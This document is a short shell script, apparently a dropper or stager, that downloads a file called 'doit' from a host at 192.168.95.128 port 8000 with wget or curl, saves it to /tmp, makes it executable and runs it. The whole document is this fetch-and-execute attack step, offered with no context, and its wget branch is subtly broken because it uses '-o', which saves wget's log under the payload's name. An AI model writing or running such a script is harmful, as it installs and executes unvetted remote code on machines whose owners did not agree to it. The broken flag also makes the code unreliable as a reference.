#!/bin/sh
if [ -x "$(command -v wget)" ]; then
	wget http://192.168.95.128:8000/doit -o /tmp/doit  &&
	chmod +x /tmp/doit &&
	/tmp/doit
fi
if [ -x "$(command -v curl)" ]; then
	curl http://192.168.95.128:8000/doit --output /tmp/doit &&
	chmod +x /tmp/doit &&
	/tmp/doit
fi
